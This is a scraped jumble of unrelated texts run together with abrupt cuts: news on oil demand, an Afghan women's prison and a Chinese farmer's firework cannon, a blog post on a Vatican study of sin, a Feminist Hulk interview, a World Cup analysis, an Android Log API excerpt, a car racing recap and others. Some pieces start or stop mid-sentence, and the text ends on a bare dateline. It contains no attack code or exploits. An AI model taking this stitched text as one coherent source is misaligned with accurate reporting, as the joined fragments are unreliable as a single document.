After attempting for months to evict the man from his plot to develop it for commercial use , Yang Youde , 56 years old , fashioned a canon made of a wheelbarrow and pipes and used fireworks bought at a local market as rockets .
" I ...
Little more than a decade ago , few imagined that the oil industry would be drilling a mile below the ocean floor in the Gulf of Mexico .
Image caption Demand for oil could rise by more than a third by 2030 Exxon says
The vast technical challenges , the risks and the mind - boggling cost of the necessary offshore operations all appeared insurmountable .
Yet what drove major companies like BP on to try and harvest these and other " difficult " new reserves was simple economics .
It was the relentless rise in demand for crude oil .
This demand pushed up the global oil price to levels where there was every incentive to overcome the obstacles and bring the oil ashore .
Food source
It was the arrival of the horseless carriage more than 100 years ago that rapidly set in train our global dependency on oil .
We have become hopelessly addicted to this flammable mixture of hydrocarbons extracted from beneath the Earth 's surface .
On average , every single person uses two litres of the stuff a day .
We refine much of it into petrol , diesel and aviation spirit to fuel our cars , lorries , trains and planes to get about .
We burn it to heat our buildings .
We rely on it to produce electric power by spinning turbines directly or creating steam to turn them .
Modern farming and food processing methods depend on oil .
Without radically changing our ways , we would starve without it .
New " dash for gas "
Oil is also in high demand as a " feedstock " to make almost everything we use in our daily lives -- from polyurethane and solvents to asphalt .
And in spite of all our efforts to harness less polluting energy sources , nothing in the world can replace oil .
Even wind turbines include oil - based products such as plastic .
Image caption Wind turbines include plastic , an oil based product
Worldwide consumption of oil is far from evenly spread .
Western and oil - rich states use vastly more than less developed countries - and nowhere is oil consumed more intensively than in the United States and Canada .
The Arab Oil Embargo of 1973 spurred some progress in reducing US oil dependence - notably in heat and power .
Today , a renewed " dash for gas " - both liquified and piped - is underway .
But the trouble is that the rising popularity of " gas- guzzling " pick - up trucks and sports utility vehicles in the 1990s has offset the benefits of tougher gasoline consumption standards .
Today , the US Government hopes to kick - start a new generation of fuel - efficient automobiles with multi-billion loans for vehicle makers .
Asian demand
So far , Ford and Nissan appear to be ahead of the pack in electric car technology .
But it seems unlikely North America will stop soaking up around a quarter of all the world 's oil - not least because its citizens current lifestyles depend on buying gasoline to travel large distances for work and leisure .
Image caption China 's demand for oil is expected to double
So , for US policymakers , the priority remains raising vehicle fuel - efficiency standards .
If all cars on US roads simply met President Obama 's plan for a minimum efficiency of 35.5 miles per gallon , the country could potentially save its entire Saudi Arabian import bill .
By contrast , the rest of us generally use more oil for heat and power than we do to get about .
That is why global demand for oil is highest when it is cold in the Northern Hemisphere .
After the US , Asia remains the next largest consuming area .
It was the region showing the fastest demand growth until the 1998 economic crisis , which was the main cause of the oil price collapse that followed .
' Peak oil '
But the biggest surge in future demand for oil will now come from China and India .
That is because , between them , these two countries account for 2.5 bn people -- a third of the world 's entire population .
India 's demand growth may be the slower of the two .
Yet the arrival there of a $ 2,000 Tata Nano car shows the country 's vast potential to drive up future world consumption .
As recently as 1990 , China got through around two million barrels of oil every day .
That figure is pushing seven million now and set to rise to twice as much again by 2030 .
As America 's Energy Information Administration points out , that extra demand alone will add 10 % to the world 's consumption .
Another way of looking at it is that the Chinese currently consume just one litre of oil a day per head , compared with 11 litres in the United States .
If the country 's oil demand were to reach US proportions , total world consumption would double .
As so called " peak oil " theorists have it , such levels of production would be impossible to achieve , now that the rate of worldwide extraction is already in , or close to , terminal decline .
Population growth
So all told how much will demand rise ?
The latest estimate from the International Energy Agency forecasts worldwide oil use may rise in 2010 by 1.7 million barrels a day .
That is a bit more than previously thought , because of slightly faster post - recessionary growth in the United States boosting fuel consumption .
Looking 20 years ahead , estimates inevitably vary .
The oil giant ExxonMobil suggests total demand for oil products could be 35 % higher by 2030 , the rise driven mainly by growing population and economic growth in developing countries .
And that is taking substantial energy efficiency gains into account .
Population growth is also a big factor .
The US census bureau predicts the world population in 2030 will be almost double that of 1980 .
More widely , the World Energy Council thinks total global energy demand growth could be as much as 50 % higher by 2030 , taking all other energy sources into account -- including water .
Yet fossil fuels will remain dominant in the mix .
Oil , natural gas and coal will still provide the vast majority of the world 's energy needs , meeting close to four - fifths of global demand through 2030 .
The fastest growing fossil fuel will be natural gas , because it is abundant , affordable and the cleanest - burning .
By 2030 , global demand for natural gas is expected to be half as much again as it is now .
' No ready alternatives '
It is not what most of us want to hear , but energy demand growth will remain focused on oil and gas because there are no ready alternatives .
Nuclear power will continue to supply a proportion of the world 's energy needs , but questions remain over public confidence , commerciality , and waste disposal .
Renewables and alternative sources of energy will play a larger role , but their contribution will remain small .
Solar , wind , and other alternatives contribute little over 1 % of America 's energy needs .
Biomass could be adding another 4 % by the end of the next decade .
But for the moment , there is no alternative to burning hydrocarbons .
Present estimates suggest production from all existing oilfields being exploited is waning by 3 % per year .
So with demand rising by some 2 % , that is a widening gap that the industry cannot bridge , with or without all that crude oil gushing into the Gulf of Mexico .
The Vatican has approved a study which concludes that men and women sin differently .
When commenting on a new book dedicated to St. Thomas Aquinas ’ teachings on the seven capital vices , Monseigneur Wojciech Giertych , personal theologian to Pope Benedict XVI , told Vatican newspaper L’Osservatore Romano that “ there is no sexual equality when it comes to sin . ”
In the article , “ The Unsuspecting Resources of Weakness , ” Mgr. Giertych referred to his own anecdotal experience at the confessional , and said his insights were supported by an analysis of confessional data carried out by the Rev. Roberto Busa , a 96 - year - old Jesuit priest .
Fr. Busa is the author of Index Thomisticus , a complete lemmatization of the works of St. Thomas Aquinas .
Mgr. Giertych asserts St. Thomas Aquinas taught that pride is humanity ’s greatest enemy because it leads a person to believe he or she does n’t need God and “ hinders a person from having a relationship with God . ”
Lust and sins against chastity “ are less dangerous because they are accompanied by a strong sense of humiliation and , as such , can be an occasion to return to God . ”
Mgr. Giertych describes men ’s sins as “ difficult , ” while women ’s are described as “ dangerous . ”
“ When one looks at capital sins not from the view of their opposition to grace but at the difficulty they create , ” Mgr. Geirtych states , “ it is clear that men experience them differently from women .
For men , the most difficult to take on is lust , followed by gluttony , sloth , anger , pride , envy and avarice .
For women , the most dangerous is pride , and then envy , anger , lust , gluttony and the last is slothfulness . ”
A woman described as a founder of feminist theology has a different spin on sin and the sexes .
Valerie Saiving ( married name – Goldstein ) , a religious studies teacher at Hobart and William Smith Colleges from 1959 to 1987 , published an essay in 1960 in which she appeals for greater awareness of the ways in which concepts of masculinity and femininity shape the ways in which we experience sin .
Her theories have been developed and refined by two generations of female scholars .
In her article , “ The Human Situation : A Feminine View , ” she forms what can be called a feminine complaint against contemporary theologians who make the mistake , she believes , of assuming that a “ thinking man ’s theology is equally good for a thinking woman . ”
The crux of Saiving ’s argument is that the focus on pride–characteristic of traditional Christian interpretations of sin–reflects male experience in a way that is inappropriate to the experience of most , if not all , women .
A landmark in both feminism and religious studies , Saiving ’s article was the first to insert gender in the study of religion .
Within two months of its publication in the Journal of Religion , Time magazine ran a 700 - word article on Saiving and her paper .
Read the Time article here .
I feel ashamed and very uneducated that I never heard of Valerie Saiving prior to researching this article .
I ’m grateful to have discovered her now .
Her analysis was the starting point for the modern development of feminist theology .
20 years after her article , author and religious studies professor , Judith Plaskow , took up and developed Saiving ’s analysis in Womenspirit Rising : A Feminist Reader in Religion .
I think it was intriguing for Mgr. Gierytch to partner with Fr. Roberta Busa , known for his usage of computers for literary and liturgical analysis .
I was a little scandalized he used confessional data ( I thought it was sacroscant ? ) and , the sampling was probably pretty small and select , since not that many people go to confession anymore , and most of the examples Mgr. Gierytech cites are nuns .

Meet Sorarya and you meet " attitude " .
It has something to do with the way she wears her red tunic and trousers , her short cropped black leather jacket , and the way she chews gum and rolls her eyes .
Sorarya is one of those jailed for ' bad character ' " What are you here for ? "
I ask as we sit in a makeshift beauty parlour , surrounded by a group of Afghan women in less flamboyant attire .
" Should I tell her ? " she asks the other women with a mischievous grin .
" Bad character , " she says after a moment 's hesitation .
She suppresses a giggle then doubles over with laughter .
Everyone giggles with her .
Sorarya does n't explain what that means .
But almost every woman in this room has been accused of " bad character " of one kind or another .
Missing school
We are sitting in Badam Bagh , or Almond Garden , Afghanistan 's only prison for women in the capital Kabul .
The prison is a window on a world where , outside these walls , women are constantly judged against a standard that makes many of their stories difficult to fathom .
Sabera ( r ) was jailed after a boy came to her house to propose Sixteen - year - old Sabera , with a pretty yellow head scarf , frets that she is missing school .
" I was about to get engaged , and the boy came to ask me himself , before sending his parents .
A lady in our neighbourhood saw us , and called the police , " she explains .
She was sentenced to three years but , in an act of mercy , it was shortened to 18 months .
Fellow inmate Aziza was accused of running away from her husband .
She says she was acquitted two months ago , but still languishes in prison .
A senior official in Afghanistan 's Ministry for Women 's Affairs told a recent UN workshop that about half of Afghanistan 's 476 women prisoners were detained for " moral crimes " .
That includes everything from running away from home , refusing to marry , marrying without their family 's wishes , and " attempted adultery " .
" In many cases women run away because they can't bear the domestic violence and then they are picked up and taken into custody for a long time , " explains Nader Nadery , a commissioner at Afghanistan 's Independent Human Rights Commission .
' What 's my crime ? '
The legal system further tips the scales of justice .
" Running away is not defined in any penal code , " says Mr Nadery .
" If there is no provision in law , they refer to Islamic Sharia law and this gives them an open hand . "
Mastura is a waif of a woman , 19 years old , and accused of adultery by her husband .
Many women in the prison have run away from home " I was three months pregnant , and he said the child was n't his and he kicked me out of our house , " she says , cradling her infant son as she perches on the edge of a metal bed in her communal cell .
" My mother lodged a complaint against him but the government locked me up . "
All the women in her cell , from teenagers to an 80 - year - old woman veiled in black , listen quietly as she tells us her story .
But they must know it by now .
" Every time I think about it , I cry , and I say to myself , ' What crime have I committed that I should be in prison ? ' " wails Mastura .
She appeals to President Hamid Karzai to allow all the women to go home .
Mastura named her son Izzatullah , which means " God 's honour " .
For an alleged crime linked to his mother 's " honour " , he 's been born a prisoner .
About 40 other young children also share their mother 's fate , living in Badam Bagh .
They sit on tiny plastic chairs watching television in a room filled with stuffed toys , and bright colours .
It could be a kindergarten anywhere - except the toddlers are minded by a woman who has been convicted of murdering her stepson .
She insists she is innocent .
Prison authorities say children are taken away to a boarding school after the age of five .
Handicraft classes Badam Bagh , home to 147 women and children , was opened two years ago and markedly improved prison conditions for women .
They used to be held at Afghanistan 's most notorious jail , Pul - e - Charki , which now has some 5,000 men .
If these women were treated with justice , I do n't think 50 % of them would be in here .
They are here because of problems in the family or personal vendettas
Prison director Zarafshana
A separate facility was built , helped by foreign aid , after concern grew about women 's conditions .
An Afghan parliamentary report had highlighted cases of women being raped inside prison walls .
The new centre , a three - storey white building , is bright and clean , and women move freely between their cells and communal areas .
Handicrafts allow them to earn some money , and computer classes teach new skills .
" Abuse and arbitrary detention is less widespread but there is still a concern about inadequate delivery of justice , " says Mr Nadery .
" I know the reality of life for Afghan women , " says Badam Bagh 's no-nonsense prison director , Zarafshana .
Unusual for an Afghan woman , she wears a business suit and no headscarf .
" If these women were treated with justice , I do n't think 50 % of them would be in here .
They are here because of problems in the family or personal vendettas . "
As we sit in a glassed in room with Zarafshana , we see Sorarya strutting down the corridor .
She told us she would be released today .
But when we leave she is still waiting for clearance to re-join the world outside .

He ’s big .
He ’s green .
His favorite activity is smashing patriarchy and all forms of oppression .
He ’s Feminist Hulk , and since he first burst onto the Twitter scene less than a month ago he ’s gathered more than 10,000 followers , who gleefully re-Tweet his 140 - character commentaries on gender , feminism and his own personal superhero , feminist theorist Judith Butler .
Tweeting in all - caps , this size - XXXXXXL superhero fights for social justice and breaks down the gender binary –all the while looking “ smashing ” in purple shorts with a big smile on his face .
Here ’s how he talks to his Tweeps :
HULK USE ALL - CAPS .
HULK CHOOSE NOT TO IMPOSE HIERARCHY ON LANGUAGE .
PLUS , BIG HULK FINGERS MAKE SHIFT -KEY PROBLEMATIC .
HULK MAKE CAPITALIZATION EXCEPTION FOR bell hooks .
I was fortunate to be granted an exclusive e-mail interview with Feminist Hulk , his first ever .
He asked that his “ literary life - partner , J. ” be included in the interview , as he put it , “ TO ELUCIDATE SOME OF HULK’S POINTS .
HULK SMASH ON MACRO LEVEL , J BETTER WITH SMALLER DETAILS . ”
When the two of them get going , it ’s plain to see that Feminist Hulk ’s Twitter feed is just the beginning of what he has to offer .
Ms. :
When did you first discover your feminist superpowers ?
feministhulk ( to J ) : WHICH CAME FIRST , THE JUDITH BUTLER OR THE RADIATION ?
J : Definitely Butler . 🙂
feministhulk : IN BEGINNING , HULK SMASH FOR LOVE OF SMASH .
LATER , HULK REALIZE CRAVING FOR SMASH CAUSED BY HEGEMONIC FORCES WHICH DISCONNECTED HULK FROM SELF .
HULK QUESTION SYSTEMS OF PRIVILEGE .
SOON HULK SMASH WITH GREATER PURPOSE .
CULTURAL MINDFULNESS GIVE HULK SUPERPOWERS OF ANTI - PATRIARCHAL SMASH !
J : Like a lot of others , I was given a reductive definition of feminism growing up .
I later realized how many kinds of feminism there are , which got me excited about the kind of feminist I wanted to be .
Ms. : Feminist theory often gets a bad rap for being too hard to follow and intimidating .
Are you trying to translate theory for a general audience ?
feministhulk : HULK LOVE POLYSYLLABIC WORDS .
HULK NUZZLE BIG GREEN FACE INTO RICHLY WRITTEN FEMINIST TEXTS .
ALSO , THIS JUST HOW HULK TALK .
J : I ’m pleasantly surprised at how little of Hulk has required translation .
Folks just get it .
While I wonder if Feminist Hulk might attract people already familiar with theory , the possibility that Hulk might be making ideas like gender performativity more accessible is awesome !
I think it also says a lot about our attitudes toward theory when a big green dude smashing shit is the less intimidating option .
feministhulk : HULK DISLIKE BEING CALLED A “ DUDE . ” SOUND LIKE HULK SPEND TIME CHUGGING PBR AND READING MAXIM , WHICH IS NOT HOW HULK IDENTIFY .
J : Sorry .
Did I hurt your feelings ?
feministhulk : HULK OK .
THANKS FOR ASKING .
Ms. : “ Smash ” is an excellent all - purpose word for what theory can do best when it ’s working well .
How powerful is your smash ?
feministhulk : SMASH LIKE A TRAVEL - SIZED VERSION OF BIG BANG .
SMASH LIKE BIG GREEN PENCIL THAT ERASE HEGEMONIC GRIDS OF SOCIAL INTELLIGIBILITY AND REPLACE THEM WITH DOODLES OF PRETTY FLOWERS .
SMASH LIKE OTHER AWESOME THINGS HULK CANNOT THINK OF RIGHT NOW .
HULK EASILY OVERWHELMED BY AWESOMENESS OF SMASH .
SOMETIMES , HULK LOVE SMASH SO MUCH HULK GET DIZZY .
J : Does Hulk need to sit down and have a cookie ?
feministhulk : GOOD IDEA .
( MUNCH MUNCH ) .
J : The physicality of smash , combined with Hulk ’s more abstract tendencies , shows that “ theory ” and “ real life ” can join .
I sympathize with those who feel like theory does n’t do enough to put its hands in the daily lives it examines , but I think the line we draw between embodying change and thinking about change is arbitrary .
It ’s a line that causes damage on both sides .
feministhulk : HULK SEE THIS AS CULTURAL TENDENCY TO SEVER MIND FROM BODY .
HULK SMASH CARTESIAN DUALITY !
( MUNCH MUNCH ) .
Ms. : You recently Tweeted “ HULK BELIEVE IN HEALING POWER OF LOVE .
HULK ALSO BELIEVE IN HEALING POWER OF SMASH . ”
How do love and smash go hand in hand ?
J : Hulk ?
feministhulk : HULK NOT DONE WITH COOKIE YET .
J : Privilege is worth getting angry about .
At the same time , privilege cuts off the possibility of compassion ( for those it robs , for those it benefits ) , which only hardens divisions .
Hulk balances anger and compassion .
feministhulk : HULK DONE WITH COOKIE NOW .
HULK ONLY SMASH HEGEMONY , PATRIARCHY AND OCCASIONAL SKYSCRAPER .
HULK NOT SMASH PEOPLE .
PEOPLE NEED LOVE .
BULLSHIT POWER ABUSES NEED SMASH .
ALSO , COOKIE WAS YUMMY .
Ms. : Is humor one of your smash tools ?
J : I ’m relieved that , no matter how many people find Hulk funny , no one seems to think feminism is the butt of the joke .
When Hulk unexpectedly became popular , I worried that new followers might assume that Hulk is making fun of feminism .
Our feminism is very sincere .
For me , the humor comes from reading references to Goldman and Whitman in Hulk ’s voice .
I ’m motivated by humor and by politics in equal measure .
feministhulk : HULK ACCEPT THAT HULK TALK FUNNY .
HULK CAN LAUGH WHILE SMASHING PATRIARCHY — HULK VERY GOOD AT MULTI - TASKING !
Ms. : Is Feminist Hulk genderqueer ?
feministhulk : HULK HAVE PENIS , IDENTIFY AS MALE , SO HULK COULD BE CONSIDERED CISGENDER .
HOWEVER , HULK DELIBERATE IN CHOICES , RESIST PRESSURE TO NATURALIZE OR PRESCRIBE GENDER SCRIPT .
SO , HULK COULD BE GENDERQUEER .
DEFINITELY HAVE GENDERQUEER POLITICS .
J : While I wo n’t reveal my gender identity here ( I think the followers have more fun trying to guess ) , writing Hulk feels like a genderqueer practice .
Slipping between my voice and his highlights to me the performativity of genderplay .
My literary life - partnership with Hulk , while nonsexual , is thoroughly queer .
feministhulk : AW .
HULK FEEL LOVED .
J WOULD LOOK GREAT IN LITTLE PURPLE SHORTS , BTW .
Ms. :
We ca n’t all be superheroes like you .
What recommendations do you have for those who might want to nurture their inner Feminist Hulk ? ”
J : I try not only to pursue change when injustice hits me personally , but also to consider the ways I might be benefiting from privilege without realizing it .
Interrogate the places where you are angry , and also interrogate the places where you are comfortable .
Be willing to learn new things about your relationship to the world .
Be brave enough to keep questioning , keep moving , keep kicking hegemonic ass !
feministhulk : PATRIARCHY NOT WORK ALONE .
SEXISM , RACISM , CLASSISM AND HOMOPHOBIA REINFORCE EACH OTHER .
HULK SAY TO FOLLOWERS : SMASH ON MULTIPLE FRONTS .
AND , JUST IN CASE YOU STUMBLE , BRING EXTRA PAIR OF PURPLE SHORTS .

Disorganised defence
John Terry was playing alongside the same central defensive partner for the first time in this World Cup , but you would n't have known it .
Time and again in the first half - hour Thomas Müller , Mesut Ozil and Miroslav Klose combined to leave the back four looking statuesque , especially down Germany 's right flank .
David James was left horribly exposed , particularly to balls in between Ashley Cole and Matthew Upson , who looked like the player that started the Slovenia game rather than the one who finished it .
Glen Johnson offered little defensively or going forward and the midfield were also culpable , being pulled this way and that by Germany and , in the shape of Gareth Barry , failing to offer any protection to a badly exposed defence .
Officials
The Uruguayan referee Jorge Larrionda and his assistant Mauricio Espinosa failed to spot that Frank Lampard 's looping shot had bounced at least a yard over the line .
Given that the goal would have put the scores level , even though England barely deserved to be so at that point , it could have changed the game .
The incident is bound to reignite the debate over goal - line technology which Sepp Blatter , who was at today 's match , sought to draw a line under in March when it was kicked into the long grass .
Such was the subsequent superiority of this young , exciting Germany team , however , the ghost goal receded as an issue as the match went on .
It is hard to retain a sense of burning injustice having been so comprehensively outplayed .
False sense of superiority , lack of flexibility
It was as though England 's players had been taken in by the spin from Joachim Löw , that they were the favourites and Germany 's young team the underdogs .
There was an element of shock ( and awe ) in the way that England were taken apart by the pace and agility of the three men playing behind Miroslav Klose .
Fabio Capello must also bear some of the blame for apparently being unable to adapt the shape of his team quickly enough to the repeated raids down both flanks .
And his substitutions , when they came , did little to change the game .
Throughout , he stuck to the rigid 4 - 4 - 2 that had served him well in qualifying but which was cruelly found out here .
Germany 's fluid formation tore through it .
The speed of youth
Low said before the match that it was " youthful lightness versus international experience " .
It was clear which won out .
Germany were simply faster in thought and deed .
As they had against Australia in their opening game , they cut through England 's defence almost at will – save for a 10 - minute spell in the first half , after Upson had pulled one back for England .
As England chased the game , their counterattacking became a master class in how to exploit the holes in a team desperate to find their way back into the game .
It was a lesson taught by Ozil and Müller , both of whom were outstanding .
Not enough big performances from big players
It might seem unfair to pick out individuals from what was a uniformly bad team performance but the captain , Steven Gerrard , so impressive against Slovenia , was largely anonymous and failed to get a grip on proceedings .
An out - of - sorts Wayne Rooney failed to spark and even in the opening stages was dropping too deep and loudly berating all around him .
John
Terry failed to marshal a defence that had huge holes in it , particularly when England began to chase the game .
Lampard , unlucky not to score on several occasions ( the ghost - goal incident when he struck the bar from a free - kick , and a fine save from Manuel Neuer ) , was perhaps the only senior England player to emerge with any credit .
Finally !
Hulu Plus has been made official , and it looks awesome .

Hulu Plus will be supported on the PS3 " soon " and the Xbox 360 in " early 2011 . "
It 'll also be supported by Samsung , Vizio and Sony TVs and Blu-ray players .

One downside ?
Even though you 're paying $ 10 / month , you 'll still need to sit through ads , which is pretty weak .
Getting double - dipped makes one feel used .
Hulu Plus is launching in July , but they 're accepting email addresses for invites to the " Hulu Plus Preview " now .
This is big .
Although , really , this makes Comedy Central 's peeling off from Hulu extra painful .
The Daily Show and Colbert Report on this would make it a must - get .
If this does well , hopefully Hulu will be able to entice more content partners to get ( back ) on board .

Religion Screws Society !
In the US , most God-fearing Jesus Jumpers and even liberal Christians think their faith gives them power over the evils of the world , and generally makes their society a better place to live .
They claim to be experts on morality , and desire to inflict their views on others through legislation .
They do n’t believe in evolution , seeing Darwin as a bad influence , alleging that atheism and secularism have no moral authority .
They bring this spiritual bludgeon to bear on political and religious enemies alike , asserting that they have cornered the market on ethics .
If this were the case , we would expect to see the US lead the developed world ( most of the rest of which are secularized , godless heathens , ) in indicators of a healthy society .
A paper published in the Journal of Religion and Society , a US academic journal , reports :
“ Many Americans agree that their churchgoing nation is an exceptional , God-blessed , shining city on the hill that stands as an impressive example for an increasingly skeptical world .
In general , higher rates of belief in and worship of a creator correlate with higher rates of homicide , juvenile and early adult mortality , STD infection rates , teen pregnancy and abortion in the prosperous democracies .
“ The United States is almost always the most dysfunctional of the developing democracies , sometimes spectacularly so . ”
If the US is an impressive example of anything , it is an example of what happens when citizens favor superstition over science , abstinence over education , and punishment over prevention .
The study concluded that the less devout the nation , the less dysfunctional it was .
Of the prosperous democratic nations , the US had the highest rates of murder .
Sexually transmitted disease in the US was up to 300 times as high as in the more secular countries .
Despite the hard - line Christian stance on abortion , the US suffered from “ uniquely high ” teen abortion rates , and syphilis infections for all ages .
This trend is also reflected within the US .
One need only look at statistics for the red vs blue states , with the states highest in conservative Christianity being most likely to suffer more social ills .
Gregory Paul , the author of the study and a social scientist , said that the evidence accumulated by a number of different studies suggested that religion might actually contribute to social ills .
“ I suspect that Europeans are increasingly repelled by the poor societal performance of the Christian states , ” he added .
There is an inverse correlation between the religious dogmatics and the democratic Darwinists , with the most religious of the nations having the worst society .
Says Mr Paul , “ The non-religious , proevolution democracies contradict the dictum that a society cannot enjoy good conditions unless most citizens ardently believe in a moral creator .
“ The widely held fear that a Godless citizenry must experience societal disaster is therefore refuted . ”

BEIJING ( Reuters ) - A Chinese farmer has declared war on property developers who want his land , building a cannon out of a wheelbarrow and pipes and firing rockets at would - be eviction teams , state media said on Tuesday .
Slideshow ( 2 images )
Yang Youde , who lives on the outskirts of bustling Wuhan city , in central Hubei province , says he has fended off two eviction attempts with his improvised weapon , which uses ammunition made from locally sold fireworks .
“ I shot only over their heads to frighten them , ” the China Daily quoted him saying of his attacks on demolition workers sent to move him off his land .
“ I did n’t want to cause any injuries . ”
The rockets can travel over 100 meters , and exploded with a deafening bang , the official paper added .
It did not say if anyone had been injured .
His approach is more aggressive than most , but Yang ’s problem is a common one .
Anger over property confiscation is one of the leading causes of unrest in China , with many people forced to give up homes and land to make way for anything from roads to luxury villas .
Yang says the local government has offered him 130,000 yuan ( $ 19,030 ) for his fields , on which they want to erect “ department buildings . ”
He is asking for five times that amount .
Construction ditches have already been dug across the land of less obstinate neighbors .
A first eviction team attacked him in February after his rockets ran out , but local police came to his rescue .
In May he held off 100 people by firing from a makeshift watchtower .
The government is planning to reform property confiscation rules , but rights groups say the changes do not go far enough to address the potentially destabilizing issue .
Log
Kotlin | Java
public final class Log
extends Object
API for sending log output .
Generally , you should use the Log.v( ) , Log.d( ) , Log.i( ) , Log.w ( ) , and Log.e( ) methods to write logs .
You can then view the logs in logcat .
The order in terms of verbosity , from least to most is ERROR , WARN , INFO , DEBUG , VERBOSE .
Verbose should never be compiled into an application except during development .
Debug logs are compiled in but stripped at runtime .
Error , warning and info logs are always kept .
Tip : A good convention is to declare a TAG constant in your class :
private static final String TAG = " MyActivity " ;
and use that in subsequent calls to the log methods .
Tip :
Do n't forget that when you make a call like
Log.v( TAG , " index= " + i ) ;

that when you 're building the string to pass into Log.d , the compiler uses a StringBuilder and at least three allocations occur : the StringBuilder itself , the buffer , and the String object .
Realistically , there is also another buffer allocation and copy , and even more pressure on the gc .
That means that if your log message is filtered out , you might be doing significant work and incurring significant overhead .
BAGHDAD —
The women of Saeed Chmagh ’s family wept , but the men did not as they watched a video of him being shot to death by a gunner on an American Apache attack helicopter .
“ I saw the truth , ” Samir Chmagh , 19 , son of the dead man , said Tuesday in his family ’s living room in Baghdad .
“ They saw clearly that they were journalists and that they were holding cameras .
It was painful when we saw this movie . ”
It was a fog - of - war moment in July 2007 on the streets of Baghdad in which American troops gunned down men they identified as insurgents .
The attack left 12 people dead , including Namir Noor - Eldeen , a 22 - year - old Reuters photographer , and Mr. Chmagh , 40 , a driver and assistant for the news agency .
A video from the cockpit of an Apache helicopter was released on Monday by WikiLeaks.org , an online organization that said it had received the video from a whistle - blower in the military .
The video has become an Internet sensation , with defenders saying the soldiers believed they were under threat and critics denouncing what they said were callous and bloodthirsty comments by the soldiers as they killed about a dozen people .
Online car geeks got their chance to prove their automotive fanboy claims were legit at the race track during season one of The Forum Wars .
The overall winner is not the car you 're thinking of .
Advertisement
Filming of all ten episodes of season one of The Forum Wars presented by Royal Purple was done on a single day in late 2009 at Irwindale Speedway in Southern California .
The twenty competitors were matched into pairs based on horsepower , modifications or plain old rivalries .
The show pitted two different online automotive forums to do battle in each episode on a eighth mile drag strip and a road course .
But since the entire season was filmed in one day ( the course layout and track conditions did n't change ) an overall winner could be determined using some simple fourth grade math .
Advertisement
Automotive online forums are filled with exaggerated horsepower bragging and unrealistic stop light to stop light drag race win claims .
For instance , " Last night I smoked a Lambo in my Integra Type - R ? "
No you did n't .
You were revving the piss out of your Integra and grinding the gears while the Lambo was making a left turn into a Starbucks .
The Forum Wars was designed to end all of this .
This was a competition of not just the cars themselves , but the people who actually buy and modify these machines .
There are plenty of car magazines sitting on the back of your toilet that can tell you if the Subaru WRX or the Mitsubishi Evo is faster in the quarter mile .
The Forum Wars is different because it determined if the type of person who purchases a Camaro SS is faster than the person who purchases a Dodge Challenger .
To determine an overall winner three aspects of the racing were used to come up with a total event lap time : reaction time , eighth mile time , and road course time .
Those of you who are familiar with drag racing know that using a 5/10 ths tree a perfect reaction time is listed as 0.500 .
So the listed reaction times had 0.500 subtracted from them to represent the actual reaction time of the driver .
The eight mile times were unadjusted as well as the road course times ( we did n't bother to add two seconds of penalty time for knuckleheads who ran over cones on the road course ) .
Throwing it all into a spreadsheet gave us the ranking of all twenty cars , drivers and the forums they represented .
Advertisement
These results are not what most of us were expecting .
How could a stock engine 317 horsepower Mustang beat out a Viper , GT - Rs and Porsches ?
Well , what The Forum Wars proved was that just because you have the money to buy an expensive car , and can login to CadillacForums.com and brag about how fast the CTS - V is , it does n't mean you can actually drive it that fast .
Advertisement
Watching all ten episodes of The Forum Wars gives you some insight as to how these unexpected results came to be .
One of the biggest implosions on the show was the road course time of Justin Beckley in his CTS -V .
After he bested the Viper in the drag race and had the lead , he went out onto the road course in his 615 horsepower V and actually had the second slowest lap time out of everyone including a 178 horsepower VW GTI .
This GTI was no hot rod either , it was lowered by its owner so much that in every corner you could hear the tires grinding on the fenders .
At the end of the show the GTI driver claimed , " I guess the coil - overs just could n't handle it . "
The coiliovers he installed of course .
A bunch of German engineers got together during a coffee break in Frankfurt and each donated some cash for a bounty on this kid 's head .
Advertisement
Every race has two things , a winner and a loser .
Avi Kaiserman in his Honda Civic
SI took home honors as the " worst driver on the show " with a redlight start , the slowest eighth mile time and the slowest road course time .
In poor Avi 's defense what you could n't see on the show was that Matt Farah from Garage 419 and The Smoking Tire was heckling the crap out of this poor kid at the drag strip start line .
Obviously Matt got into this kid's head ( Avi mentions it during his interview as the credits roll ) .
Advertisement
Not all of the results were completely unexpected .
Adam Bruce , the guy who started Streetfire .net and Autostream.com , picked up the best overall eighth mile time with a 7.89 using the launch control on his GT - R .
That was good enough to give him the final podium spot on the show .
The car he ran against , a Porsche 996 driven like a madman on the road course by Enrrique Gutierrez , took second place overall .
Advertisement
The car that really disappointed was the heavily modified 746 horsepower GT -R of Justin Green .
Justin choked the start with a " stoner " reaction time of 1.020 seconds ( if he had cut a better light he would have come in second place overall ) .
For the road course he put in a ringer driver which referred to as his " special sauce , " Michael Ramies , a Skip Barber Western Region Champion and aspiring USF1 racer .
This combination of 746 horsepower and a " pro " driver was still over a second slower on the road course than the 317 horsepower Mustang driven by , of all things , a blogger .
Advertisement
Speaking of " stoner " reaction times , the " Bob Marley " award goes to Sam Malapas in his Evo for sleeping at the light with a worst of show reaction time of 1.324 seconds .
He lost his episode to a WRX STI driven by Jonathan Gih , who claimed to have a fair amount of " track time experience " and then he ceremoniously went across the finish line and mowed down a delineator making everyone on I - club.com cringe in embarrassment .
Advertisement
Since this was The Forum Wars , the smack talking did n't finish when the checkered flag dropped .
Actually the results of the shows just fueled the online fire .
The one guy who took the brunt of this Internet lambasting was Richard Seville in the 350Z .
He lost the first episode to the overall winner , but he managed to finish 5th overall besting a Porsche Turbo , an M3 , an M5 , a Viper , and plenty of other cars that on paper should had crushed him .
But that did n't matter one bit , the folks on My350Z.com have spent their evenings flaming him endlessly for losing to a Mustang .
It 's too bad because when you watch all of the episodes and see some of the dismal driving that went on it shows that Richard really drove the hell out of that Z .
Advertisement
So how did a Mustang win over all of these big horsepower performance machines ?
Certainly nobody expected it to .
At the event Steve Kuhtz 's 2008 Ford Mustang Shelby GT hardly got a second glance since most of the cars at the event had over 450 horsepower including the " real " Shelby at the event , a GT 500 .
Advertisement
Most people consider this car to be the Shelby since the GT 500 boasts 500 ponies , where the Shelby GT is essentially just a stock Mustang GT with Shelby springs , sway bars and a cold air intake kit from Ford Racing .
However , the GT 500 was a total flop at the event with an eighth mile time of 10.40 ( the second slowest all day ) .
Advertisement
It was n't gobs of horsepower or exotic twin turbos that won The Forum Wars .
And it was n't a professional driver slipped into the mix .
It was a simple , solid axle , naturally aspirated Ford Mustang that picked up the overall win .
The Mustang had the best reaction time of the day , 36 thousandths of a second , and the fastest road course time by over a full second giving it the top time of the day .

So what did we learn from The Forum Wars ?
It ai n't just the machine or the statistics .
You gotta drive it to win it .

Washington ( CNN ) --
